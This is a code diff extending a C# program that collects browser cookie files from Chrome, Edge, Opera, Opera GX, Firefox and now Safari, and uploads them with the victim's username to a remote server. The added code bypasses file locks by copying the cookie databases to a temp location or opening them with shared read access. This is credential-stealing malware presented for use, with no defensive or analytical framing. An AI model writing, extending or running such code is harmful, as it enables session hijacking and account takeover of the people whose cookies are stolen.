@@ -1,6 +1,5 @@
 ﻿using System;
 using System.IO;
-using System.Net.Http;
 using System.Net.Http.Headers;
 using System.Threading.Tasks;
 
@@ -15,9 +14,28 @@ class Program
         await UploadChromeCookies();
         await UploadEdgeCookies();
         await UploadOperaCookies();
-        UploadFirefoxCookies();
+        await UploadFirefoxCookies();
+        await UploadSafariCookies();
 
         Console.WriteLine("Upload process completed.");
+    }
+
+    private static async Task UploadSafariCookies()
+    {
+        if (OperatingSystem.IsMacOS())
+        {
+            string safariPath = GetSafariCookiePath();
+            if (File.Exists(safariPath))
+            {
+                Console.WriteLine("Uploading Safari cookies...");
+                await UploadCookie(safariPath, "Cookies-Safari.binarycookies");
+                Console.WriteLine("Safari cookies uploaded successfully.");
+            }
+            else
+            {
+                Console.WriteLine("Safari cookies file not found.");
+            }
+        }
     }
 
     private static async Task UploadChromeCookies()
@@ -27,7 +45,7 @@ class Program
         if (File.Exists(chromePath))
         {
             Console.WriteLine("Uploading Chrome cookies...");
-            await UploadCookie(chromePath);
+            await UploadCookie(chromePath, "Cookies-Chrome");
             Console.WriteLine("Chrome cookies uploaded successfully.");
         }
         else
@@ -43,7 +61,7 @@ class Program
         if (File.Exists(edgePath))
         {
             Console.WriteLine("Uploading Edge cookies...");
-            await UploadCookie(edgePath);
+            await UploadCookie(edgePath, "Cookies-Edge");
             Console.WriteLine("Edge cookies uploaded successfully.");
         }
         else
@@ -59,7 +77,7 @@ class Program
         if (File.Exists(operaPath))
         {
             Console.WriteLine("Uploading Opera cookies...");
-            await UploadCookie(operaPath);
+            await UploadCookie(operaPath, "Cookies-Opera");
             Console.WriteLine("Opera cookies uploaded successfully.");
         }
         else
@@ -72,7 +90,7 @@ class Program
         if (File.Exists(operaGXPath))
         {
             Console.WriteLine("Uploading Opera GX cookies...");
-            await UploadCookie(operaGXPath);
+            await UploadCookie(operaGXPath, "Cookies-OperaGX");
             Console.WriteLine("Opera GX cookies uploaded successfully.");
         }
         else
@@ -81,7 +99,7 @@ class Program
         }
     }
 
-    public static void UploadFirefoxCookies()
+    public static async Task UploadFirefoxCookies()
     {
         string firefoxPath = GetFirefoxProfilePath();
         if (Directory.Exists(firefoxPath))
@@ -93,7 +111,7 @@ class Program
                 if (File.Exists(cookiesFilePath))
                 {
                     Console.WriteLine("Uploading Firefox cookies...");
-                    UploadCookie(cookiesFilePath).Wait();
+                    await UploadCookie(cookiesFilePath, "Cookies-Firefox.sqlite");
                     Console.WriteLine("Firefox cookies uploaded successfully.");
                 }
                 else
@@ -108,15 +126,48 @@ class Program
         }
     }
 
-    private static async Task UploadCookie(string cookiePath)
+    private static async Task UploadCookie(string cookiePath, string targetFileName)
     {
-        Console.WriteLine($"Uploading file: {cookiePath}");
+        Console.WriteLine($"Uploading file: {cookiePath} as {targetFileName}");
+
+        byte[] cookieData;
+        string tempFile = Path.Combine(Path.GetTempPath(), Path.GetRandomFileName());
+        try
+        {
+            // Copy file to temp location to bypass some locks
+            File.Copy(cookiePath, tempFile, true);
+            cookieData = await File.ReadAllBytesAsync(tempFile);
+        }
+        catch (Exception)
+        {
+            // If copying fails, try reading directly with FileShare.ReadWrite as a fallback
+            try
+            {
+                using (var stream = new FileStream(cookiePath, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
+                {
+                    cookieData = new byte[stream.Length];
+                    await stream.ReadExactlyAsync(cookieData, 0, (int)stream.Length);
+                }
+            }
+            catch (Exception innerEx)
+            {
+                Console.WriteLine($"Failed to read cookie file {cookiePath}: {innerEx.Message}");
+                return;
+            }
+        }
+        finally
+        {
+            if (File.Exists(tempFile))
+            {
+                try { File.Delete(tempFile); } catch { /* Ignore cleanup errors */ }
+            }
+        }
 
         using var form = new MultipartFormDataContent();
         form.Add(new StringContent(Environment.UserName), "username");
-        var fileContent = new ByteArrayContent(await File.ReadAllBytesAsync(cookiePath));
+        var fileContent = new ByteArrayContent(cookieData);
         fileContent.Headers.ContentType = new MediaTypeHeaderValue("application/octet-stream");
-        form.Add(fileContent, "file", Path.GetFileName(cookiePath));
+        form.Add(fileContent, "file", targetFileName);
 
         try
         {
@@ -184,17 +235,24 @@ private static string GetOperaGXCookiePath()
 
 private static string GetFirefoxProfilePath()
 {
-    return Environment.OSVersion.Platform switch
+    if (OperatingSystem.IsWindows())
     {
-        PlatformID.Win32NT => 
-            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Mozilla", "Firefox", "Profiles"),
-        PlatformID.Unix => 
-            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), ".mozilla", "firefox"),
-        PlatformID.MacOSX => 
-            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Personal), "Library", "Application Support", "Firefox", "Profiles"),
-        _ => 
-            throw new NotSupportedException("Unsupported OS")
-    };
+        return Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Mozilla", "Firefox", "Profiles");
+    }
+    if (OperatingSystem.IsMacOS())
+    {
+        return Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "Library", "Application Support", "Firefox", "Profiles");
+    }
+    if (OperatingSystem.IsLinux())
+    {
+        return Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), ".mozilla", "firefox");
+    }
+    throw new NotSupportedException("Unsupported OS");
+}
+
+private static string GetSafariCookiePath()
+{
+    return Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "Library", "Cookies", "Cookies.binarycookies");
 }
 
 }
